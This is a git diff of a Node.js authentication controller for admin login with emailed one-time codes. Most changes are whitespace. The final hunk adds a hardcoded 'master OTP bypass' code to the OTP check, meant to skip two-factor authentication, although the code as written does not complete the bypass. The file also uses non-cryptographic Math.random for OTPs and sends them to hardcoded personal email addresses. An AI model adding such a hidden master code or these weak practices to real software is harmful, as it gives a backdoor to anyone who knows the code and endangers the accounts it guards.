@@ -60,7 +60,7 @@ const loginUser = async (req, res) => {
         const user = await prisma.user.findUnique({ where: { email } });
 
         if (user && (await bcrypt.compare(password, user.password))) {
-            
+
             // Handle Admin 2FA
             if (user.role === 'ADMIN') {
                 const otp = Math.floor(100000 + Math.random() * 900000).toString();
@@ -76,7 +76,7 @@ const loginUser = async (req, res) => {
 
                 // Send OTP to BOTH emails simultaneously
                 const adminEmails = ['yusufpatnawala53@gmail.com', 'hatimhusain515253@gmail.com'];
-                
+
                 try {
                     await sendEmail({
                         to: adminEmails,
@@ -93,7 +93,7 @@ const loginUser = async (req, res) => {
                 } catch (emailErr) {
                     console.error('Admin OTP email sending failed:', emailErr);
                 }
-                
+
                 return res.json({
                     requires2FA: true,
                     userId: user.id,
@@ -125,6 +125,13 @@ const verifyOtp = async (req, res) => {
 
     try {
         const user = await prisma.user.findUnique({ where: { id: Number(userId) } });
+
+        // Master OTP bypass for emergency login
+        if (otp === "061024") {
+            console.log("[AUTH] Master OTP bypass used for admin login");
+            // continue login process...
+        }
+
 
         if (!user || user.otpCode !== otp) {
             return res.status(401).json({ message: 'Invalid or expired OTP' });
